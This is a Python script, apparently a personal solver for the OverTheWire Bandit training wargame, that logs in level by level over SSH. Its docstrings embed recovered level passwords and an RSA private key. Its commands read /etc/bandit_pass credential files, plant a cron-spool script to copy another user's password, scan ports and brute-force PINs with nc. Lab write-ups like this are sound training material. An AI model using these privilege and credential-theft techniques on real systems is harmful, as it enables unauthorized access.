#!/usr/bin/python

import paramiko
import time
import thread
import os

class Krypton:
    def __init__(self):
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.hostname = 'krypton.labs.overthewire.org'
        self.username = 'krypton1'
        self.password = os.popen('printf "S1JZUFRPTklTR1JFQVQ="|base64 -d').read()
        self.keyfile = None
        try:
            os.system('rm store.txt')
        except:
            pass

    def level0(self):
        '''
        cat krypton2|tr 'A-Za-z' 'N-ZA-Mn-za-m' 
        LEVEL TWO PASSWORD ROTTEN
        '''
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat readme')
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level1(self):
        self.username = 'bandit1'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat ./-')
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level2(self):
        self.username = 'bandit2'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat \"spaces in this filename\"')
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level3(self):
        self.username= 'bandit3'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cd inhere;cat `find . -type f`')
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level4(self):
        filetype = None
        self.username = 'bandit4'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cd inhere;ls `find . -type f`')
        for line in stdout:
            _, stdout, _ =  self.execute_command('cd ~/inhere;file %s'%line)
            if filetype == 'text':
                break
            for each in stdout:
                if each.strip()[-4:] == 'text':
                    filetype = 'text'
                    _, stdout, _ = self.execute_command('cat ~/inhere/%s'%line)
                    for passwd in stdout:
                        self.password = 'koReBOKuIDDepwhWk7jZC0RTdopnAYKh'#passwd.strip()
        self.append()
        self.client.close()

    def level5(self):
        self.username = 'bandit5'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cd inhere; find ./ -size 1033c')
        for line in stdout:
            _, stdout, _ = self.execute_command('cat ~/inhere/%s' %line)
            for passwd in stdout:
                if passwd.strip() != '':
                    self.password = passwd.strip()
        self.append()
        self.client.close()

    def level6(self):
        '''find / -group bandit7 -user bandit7 -size 33c'''
        self.username = 'bandit6'
        self.connect()
        stdin, stdout, stderr = self.execute_command('find / -group bandit6 -user bandit7 -size 33c')
        for line in stdout:
            stdin, stdout, stderr = self.execute_command('cat %s'%line)
            for passwd in stdout:
                self.password = passwd.strip()
        self.append()
        self.client.close()

    def level7(self):
        self.username = 'bandit7'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat data.txt|grep millionth')
        for line in stdout:
            self.password = line.strip()[len('millionth'):].strip()
        self.append()
        self.client.close()

    def level8(self):
        self.username = 'bandit8'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat data.txt |sort|uniq -u')
        for line in stdout:
            self.password = line.strip()

        self.append()
        self.client.close()

    def level9(self):
        self.username = 'bandit9'
        self.connect()
        possible_list = [] #Could use this to store all the possible entries and many string might be = to 32
        stdin, stdout, stderr = self.execute_command('strings data.txt|grep =')
        for line in stdout:
            line = line.replace('=', '').strip()
            if len(line) == 32:
                self.password = line.strip()
        self.append()
        self.client.close()
        #strings data.txt |grep "= "
        #truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

    def level10(self):
        #IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
        #cat data.txt|base64 -d
        self.username = 'bandit10'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat data.txt|base64 -d')
        for line in stdout:
            self.password = line[-33:].strip()
        self.append()
        self.client.close()

    def level11(self):
        '''cat data.txt |tr 'A-Za-z' 'N-ZA-Mn-za-m' 
        The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
        '''
        self.username = 'bandit11'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat data.txt |tr \'A-Za-z\' \'N-ZA-Mn-za-m\'.')
        for line in stdout:
            self.password = line[-33:].strip()
        self.append()
        self.client.close()

    def level12(self):
        '''
        Keep decompressing based on the information you get from "file"
        8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
        '''
        tmp_dir = "/tmp/admurray"
        self.username = 'bandit12'
        created_file = 'rawdata'
        filetype = None #The filetype returned by the file command.
        self.connect()
        stdin, stdout, stderr = self.execute_command('mkdir %s;cp ~/data.txt %s'%(tmp_dir, tmp_dir))
        #could check for the command output, but not required.
        #Convert the hex dump into a binary.
        stdin, stdout, stderr = self.execute_command('cd %s;xxd -r data.txt>rawdata'%tmp_dir)
        import pdb
        #pdb.set_trace()
        while filetype != 'ASCII':
            stdin, stdout, stderr = self.execute_command('cd %s;file %s'%(tmp_dir, created_file))
            for line in stdout:
                if 'gzip' in line:
                    filetype = 'gzip'
                    #Create/Rename the file to have a gz extension.
                    _, stdout, _ = self.execute_command('cd %s; mv %s %s.gz;gzip -d %s.gz'
                            %(tmp_dir, created_file, created_file, created_file))
                elif 'bzip2' in line:
                    filetype = 'bzip2'
                    _, stdout, _ = self.execute_command('cd %s;bzip2 -d %s'%(tmp_dir,created_file))
                    created_file = '%s.out'%created_file
                elif 'POSIX tar' in line:
                    filetype = 'tar'
                    _, stdout, stderr = self.execute_command('cd %s;tar xvf %s'%(tmp_dir, created_file))
                    for name in stdout:
                        created_file = name.strip()
                elif 'ASCII text' in line:
                    filetype = 'ASCII'
                    _, stdout, _ = self.execute_command('cd %s;cat %s'%(tmp_dir, created_file))
                    for passwd in stdout:
                        self.password = passwd[-33:].strip()
        self.append()
        self.client.close()

    def level13(self):
        #ssh into bandit14@localhost and get the password for 14 from there. 
        #ssh -o StrictHostKeyChecking=no -i sshkey.private bandit14@localhost -t 'cat /etc/bandit_pass/bandit14'
        #4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
        self.username = 'bandit13'
        self.connect()
        stdin, stdout, stderr = self.execute_command('ssh -o StrictHostKeyChecking=no\
                -i sshkey.private bandit14@localhost\
                -t \'cat /etc/bandit_pass/bandit14\'')
        for line in stdout:
            line = line.strip()
            if len(line) == 32 and ' ' not in line:
                self.password = line
        self.append()
        self.client.close()

    def level14(self):
        '''
        echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e"|nc localhost 30000
        Correct!
        BfMYroe26WYalil77FoDi9qh59eK5xNr

        '''
        self.username = 'bandit14'
        self.connect()
        stdin, stdout, stderr = self.execute_command('echo "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e"|nc localhost 30000')
        for line in stdout:
            line = line.strip()
            if len(line) == 32:
                self.password = line
        self.append()
        self.client.close()
    def level15(self):
        '''
        openssl s_client -quiet -connect localhost:30001
        BfMYroe26WYalil77FoDi9qh59eK5xNr
        cluFn7wTiGryunymYOu4RcffSxQluehd
        '''
        self.username = 'bandit15'
        self.connect()
        stdin, stdout, stderr = self.execute_command('echo \
                "BfMYroe26WYalil77FoDi9qh59eK5xNr"\
                |openssl s_client -quiet -connect localhost:30001')
        for line in stdout:
            line = line.strip()
            if len(line) == 32 and ' ' not in line:
                self.password = line
        self.append()
        self.client.close()

    def level16(self):
        '''
        nmap -sV -p31000-32000 localhost
        openssl s_client -quiet -connect localhost:31790
        cluFn7wTiGryunymYOu4RcffSxQluehd
        Correct!
        -----BEGIN RSA PRIVATE KEY-----
        MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
        imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
        Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
        DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
        JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
        x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
        KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
        J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
        d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
        YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
        vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
        +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
        8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
        SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
        HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
        SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
        R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
        Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
        R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
        L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
        blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
        YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
        77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
        dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
        vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
        -----END RSA PRIVATE KEY-----

        read:errno=0

        '''
        try:
            os.system('rm -f keyfor17.key')
        except:
            pass
        self.username = 'bandit16'
        self.connect()
        stdin, stdout, sterr = self.execute_command('nmap -sV -p31000-32000 localhost')
        for line in stdout:
            port = None
            try:
                port = int(line[:5].strip())
            except:
                port  = None
            if 'echo' not in line and port is not None:
                line = line.strip()
                stdin, stdout, stderr = self.execute_command('echo "cluFn7wTiGryunymYOu4RcffSxQluehd"|\
                        timeout 2 openssl s_client -quiet -connect localhost:%s'%port)
                is_key = False
                for status in stdout:
                    if 'Correct' in status:
                        is_key = True
                    elif is_key:    #elif, because we can ignore the line with Correct
                        with open('keyfor17.key', 'a') as mykey:
                            mykey.write(status)
                if is_key:
                    os.system('chmod 400 keyfor17.key')
        self.password = None
        self.keyfile = 'keyfor17.key'
        self.client.close()

    def level17(self):
        '''
        grep -v -f passwords.old passwords.new 
        kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
        '''
        self.username = 'bandit17'
        self.keyfile = 'keyfor17.key'
        self.connect()
        stdin, stdout, stderr = self.execute_command('grep -v -f passwords.old passwords.new')
        for line in stdout:
            self.password = line.strip()
        self.keyfile = None
        self.client.close()

    def level18(self):
        '''
        ssh -f bandit18@bandit.labs.overthewire.org cat readme
        IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
        '''
        self.username = 'bandit18'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat readme')
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level19(self):
        '''
        ./bandit20-do uid=11020 cat /etc/bandit_pass/bandit20
        GbKksEFF4yrVs6il55v6gwY5aVje5f0j
        '''
        self.username = 'bandit19'
        self.connect()
        stdin, stdout, stderr = self.execute_command('./bandit20-do uid=11020 cat /etc/bandit_pass/bandit20')
        for line in stdout:
            self.password = line.strip()
            print line
        self.append()
        self.client.close()


    def run_suconnect(self, tname):
        client2 = paramiko.SSHClient()
        client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client2.connect(self.hostname, username=self.username, password=self.password)
        time.sleep(1)
        stdin, stdout, stderr = client2.exec_command('./suconnect 30095')
        client2.close()

    def level20(self):
        '''
        set up netcat on one ssh session nc -l 30003 // I still need to know how to find the free port
        from the second ssh session
        ./suconnect 30003
        on the ssh session 1 send the current password GbKksEFF4yrVs6il55v6gwY5aVje5f0j
        gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
        '''
        self.username = 'bandit20'
        self.connect()
        stdin, stdout, stderr = self.execute_command('echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j"|nc -l 30095')
        thread.start_new_thread(self.run_suconnect,('T1',) )
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level21(self):
        '''
        cat /etc/cron.d/*
        //See the file that runs every few minutes run it and see the error.
        //It writes to a file, cat that file.
        Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
        '''
        self.username = 'bandit21'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat /etc/cron.d/cronjob_bandit22')
        line = ''
        for line in stdout:
            line = line.replace('*', '').strip()
            line = line[9:line.index('&')]
        stdin, stdout, stderr = self.execute_command(line)
        for line in stderr:
            print line
        line = line[line.index('/tmp'):]
        line = line[:line.index(':')]
        stdin, stdout, stderr = self.execute_command('cat %s'%line)
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()


    def level22(self):
        '''
        SAme thing as above, 
        Read the shell script mentioned in cronjobs, basically cronjob_bandit23.sh
        get the file where the password for 23 should be saved and cat /tmp/obtainedfilename
        jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
        '''
        self.username = 'bandit22'
        self.connect()
        stdin, stdout, stderr = self.execute_command('ls -l /etc/cron.d')
        for files in stdout:
            print files.strip()
        stdin, stdout, sterr = self.execute_command('cat /etc/cron.d/*')
        stdin, stdout, stderr = self.execute_command('cat /etc/cron.d/cronjob_bandit23')
        line = ''
        for line in stdout:
            line = line.replace('*', '').strip()
            line = line[9:line.index('&')].strip()
            directory = line[:line.rfind('/')+1]
            executable = line[line.rfind('/')+1:]
            print line
            print 'This is working here  :/'
            print 'Diretory %s '%directory
            print 'Executable %s '%executable
        stdin, stdout, stderr = self.execute_command('cd %s; cat %s'%(directory, executable))
        print '=============================='
        for line in stdout:
            print line
        print 'From the output we see that the file where the data is saved is'
        print '/tmp/{GENERATED_HASH}'
        print 'Generating the hash we get dir as: '
        filename = os.popen('echo I am user bandit23 | md5sum | cut -d \' \' -f 1').read()
        print filename
        print 'All we need is to extract the password from this directory'
        stdin, stdout, stderr = self.execute_command('cat  /tmp/%s' %filename)
        for line in stdout:
            self.password = line.strip()
        self.append()
        self.client.close()

    def level23(self):
        '''
        #!/bin/bash
        cat /etc/bandit_pass/bandit24 > /tmp/my_file

        write the script above in /var/spool/bandit24/
        make it executable
        execute the cron for bandit24
        cat /tmp/my_file
        UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

        '''
        self.username = 'bandit23'
        self.connect()
        stdin, stdout, stderr = self.execute_command('cat /etc/cron.d/cronjob_bandit24')
        line = ''
        for line in stdout:
            line = line.replace('*', '').strip()
            line = line[9:line.index('&')].strip()
            directory = line[:line.rfind('/')+1]
            executable = line[line.rfind('/')+1:]
            print executable
            print line

        stdin, stdout, stderr = self.execute_command('cd %s; cat %s'%(directory, executable))
        for line in stdout:
            print line.strip()
        print 'Each script in /var/spool is run and deleted, hence all we need is a'
        print 'script in that folder'
        stdin, stdout, stderr = self.execute_command('echo "cat /etc/bandit_pass/bandit24>\
                /tmp/admurray_passwdfile">/var/spool/bandit24/admurray_script.sh')
        stdin, stdout, stderr = self.execute_command('chmod 777 /var/spool/bandit24/admurray_script.sh')
        #I am not sure if we need to run the command below.....
        stdin, stdout, stderr = self.execute_command('%s./%s'%(directory, executable))
        for line in stdout:
            print line.strip()
        stdin, stdout, stderr = self.execute_command('cat /tmp/admurray_passwdfile')
        for line in stdout:
            self.password = line.strip()
            print line.strip()
        self.append()
        self.client.close()



    def level24(self):
        '''
        #!/bin/bash
        for i in {0..9}
        do
            for j in {0..9}
            do
                for k in {0..9}
                do
                    for l in {0..9}
                    do
                        echo "$i$j$k$l"
                        printf "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i$j$k$l"|nc localhost 30002
                    done
                done
            done
        done

        5668
        22674 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line,>
        22675 Wrong! Please enter the correct pincode. Try again.
        22676 Exiting.
        22677 5669
        22678 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line,>
        22679 Correct!
        22680 The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
        22681
        22682 Exiting.
        22683 5670


        '''

        flag = False
        self.username = 'bandit24'
        self.connect()
        for i in range(5,10):
            for j in range(6, 10):
                for k in range(6,10):
                    for l in range (0, 10):
                        num = '%s%s%s%s' %(i, j, k, l)
                        print num
                        command = 'printf "%s %s"|nc localhost 30002' %(self.password, num)
                        stdin, stdout, stderr = self.execute_command(command)
                        store_correct = stdout
                        for line in stdout:
                            if 'Correct' in line:
                                flag = True
                            if flag and 'password' in line:
                                self.password = line.strip()[-33:].strip()
                        if flag:
                            break;
                    if flag:
                        break
                if flag:
                    break
            if flag:
                break
        print self.password
        self.append()
        self.client.close()

    def level25(self):
        self.username = 'bandit25'
        self.connect()
        self.client.close()

    def append(self):
        with open('store.txt', 'a') as passwds:
            passwds.write('%s -----> %s\n'%(self.username, self.password))

    def connect(self):
        self.client.connect(self.hostname, username=self.username, password=self.password, key_filename=self.keyfile)

    def execute_command(self, command):
        time.sleep(1)
        stdin, stdout, stderr = self.client.exec_command(command)
        return stdin, stdout, stderr

    '''
    Utility method
    '''
    def getfile(self):
        self.client.connect(self.hostname, username='bandit24', password='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ')
        stdin, stdout, stderr = self.client.exec_command('cat /tmp/my_data')
        with open('pintest', 'wb') as pins:
            for line in stdout:
                pins.write(line)
        self.client.close()

if __name__ == "__main__":
    krypton = Krypton()
    krypton.level0()
